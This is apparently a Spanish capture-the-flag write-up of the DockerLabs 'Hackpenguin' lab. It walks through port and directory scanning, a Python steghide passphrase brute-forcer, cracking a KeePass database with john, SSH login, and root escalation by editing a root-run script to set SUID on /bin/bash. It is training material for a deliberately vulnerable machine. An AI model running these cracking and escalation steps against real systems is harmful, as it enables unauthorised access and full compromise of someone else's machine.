---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Hackpenguin DockerLabs (Intermediate)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip hackpenguin.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh hackpenguin.tar
```

Info:

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-20 11:16 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:13:95:24:c7:08:e8:36:51:6d:ab:b2:e5:3e:3b:da (ECDSA)
|_  256 e2:f3:81:1f:7d:d0:ea:ed:e0:c6:38:11:ed:95:3a:38 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```

Si entramos en el puerto `80` nos encontramos una pagina normal de apache2, pero si fuzzeamos de forma mas profunda.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.html       (Status: 403) [Size: 275]
/.htpasswd.php        (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/.htpasswd.html       (Status: 403) [Size: 275]
/.htpasswd.txt        (Status: 403) [Size: 275]
/.htaccess.php        (Status: 403) [Size: 275]
/.htaccess.txt        (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10671]
/penguin.html         (Status: 200) [Size: 342]
/server-status        (Status: 403) [Size: 275]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos una pagina llamada `/penguin.html` que si entramos dentro veremos una pagina con una foto de pinguinos, diciendo que no hay nada interesante en esa pagina.

## ForceBrute Steghide

Pero si nos descargamos esa imagen y le hacemos `steghide` veremso que nos pide un salvoconducto, por lo que haremos fuerza bruta creando un script.

> forcebrute.py

```python
import subprocess

def test_password(image_path, password, output_file):
    """ Intenta extraer un archivo oculto usando Steghide con la contraseña dada. """
    command = [
        'steghide', 'extract', '-sf', image_path, '-p', password, '-xf', output_file
    ]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.returncode == 0

def brute_force(image_path, dictionary_file, output_file):
    """ Realiza un ataque de fuerza bruta usando una lista de contraseñas. """
    with open(dictionary_file, 'r') as file:
        for line in file:
            password = line.strip()
            print(f"Probando contraseña: {password}")
            if test_password(image_path, password, output_file):
                print(f"¡Contraseña encontrada! Es: {password}")
                return password
    print("No se encontró la contraseña en el diccionario.")
    return None

if __name__ == "__main__":
    imagen = "penguin.jpg"  # Archivo de imagen con datos ocultos
    diccionario = "/usr/share/wordlists/rockyou.txt"  # Archivo de diccionario con posibles contraseñas
    archivo_extraido = "archivo_extraido.txt"  # Archivo donde se extraerá el contenido

    brute_force(imagen, diccionario, archivo_extraido)
```

```shell
python3 forcebrute.py
```

Info:

```
Probando contraseña: 123456
Probando contraseña: 12345
Probando contraseña: 123456789
Probando contraseña: password
Probando contraseña: iloveyou
Probando contraseña: princess
Probando contraseña: 1234567
Probando contraseña: rockyou
Probando contraseña: 12345678
Probando contraseña: abc123
Probando contraseña: nicole
Probando contraseña: daniel
Probando contraseña: babygirl
Probando contraseña: monkey
Probando contraseña: lovely
Probando contraseña: jessica
Probando contraseña: 654321
Probando contraseña: michael
Probando contraseña: ashley
Probando contraseña: qwerty
Probando contraseña: 111111
Probando contraseña: iloveu
Probando contraseña: 000000
Probando contraseña: michelle
Probando contraseña: tigger
Probando contraseña: sunshine
Probando contraseña: chocolate
¡Contraseña encontrada! Es: chocolate
```

Por lo que la contraseña es `chocolate`.

## Steghide

```shell
steghide extract -sf penguin.jpg
```

Info:

```
wrote extracted data to "penguin.kdbx".
```

Vemos que nos a extraido un archivo llamado `penguin.kdbx`, que es un gestor de contraseñas de `KeePassCX`.

Si instalamos `keepassxc` y lo iniciamos de la siguiente forma.

```shell
keepassxc
```

Nos aparecera un entorno grafico del gestor, seleccionamos la base de datos que es el archivo, pero nos pedira contraseña para desbloquearlo, por lo que haremos fuerza bruta.

## Keepass

```shell
keepass2john penguin.kdbx > hash_keep
```

```shell
john --wordlist=<WORDLIST> hash_keep
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (penguin)     
1g 0:00:00:00 DONE (2024-08-20 11:36) 4.761g/s 304.7p/s 304.7c/s 304.7C/s 123456..charlie
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Por lo que vemso obtenemos la contarseña, asi que ahora la meteremos en el `keepassxc` y lo haremos desbloqueado, veremos las credenciales:

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

Pero el usuario sera `penguin`, por lo que nos conectaremos por ssh.

## SSH

```shell
ssh penguin@<IP>
```

Metemos la contraseña y ya estariamos dentro.

## Privilege Escalation

Si listamos los archivos que hay.

```
drwxrwxrwx 1 root    root        4096 Aug 20 15:49 .
drwxr-xr-x 1 root    root        4096 Apr 15 07:22 ..
drwx------ 2 penguin hackpenguin 4096 Aug 20 15:39 .cache
drwxr-xr-x 3 penguin hackpenguin 4096 Aug 20 15:48 .local
-rwxrwxrwx 1 root    root          22 Aug 20 15:47 archivo.txt
-rwxrwxrwx 1 root    root          32 Aug 20 15:49 script.sh
```

Vemos que 2 archivos son de `root` pero los podemos editar y si ahora vamos a ver los procesos.

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1 29.1  0.0   2892  1920 ?        Ss   15:15  10:04 /bin/sh -c service apache2 start && service ssh start && while true; do /bin/bash /home/hackpenguin/script.sh; done
root          25  0.1  0.0   6780  4580 ?        Ss   15:15   0:03 /usr/sbin/apache2 -k start
www-data      26  4.3  0.0 1933812 7540 ?        Sl   15:15   1:29 /usr/sbin/apache2 -k start
www-data      27  4.1  0.0 1999332 7524 ?        Sl   15:15   1:27 /usr/sbin/apache2 -k start
root          92  0.0  0.0  15436  5588 ?        Ss   15:15   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root      766251  0.0  0.1  16732 10676 ?        Ss   15:39   0:00 sshd: penguin [priv]
penguin   766862  0.1  0.0  16992  7656 ?        D    15:39   0:00 sshd: penguin@pts/0
penguin   766874  0.0  0.0   2892  1536 pts/0    Ss   15:39   0:00 -sh
penguin   768265  0.0  0.0   5052  3840 pts/0    S    15:39   0:00 /bin/bash
```

Vemos que `root` esta ejecutando el `script.sh` (`root 1 29.1 0.0 2892 1920 ? Ss 15:15 10:04 /bin/sh -c service apache2 start && service ssh start && while true; do /bin/bash /home/hackpenguin/script.sh; done`) por lo que haremos lo siguiente.

```shell
nano script.sh

#Dentro del nano
#!/bin/bash
chmod u+s /bin/bash
```

Lo guardamos y esperaremos a que lo ejeucte `root`, cuando lo haya hecho si vemos lo siguiente.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

Vemos que funciono y ya podremos ser `root` de la siguiente forma.

```shell
bash -p
```

Y con esto ya seremos `root`, por lo que habriamos terminado la maquina.
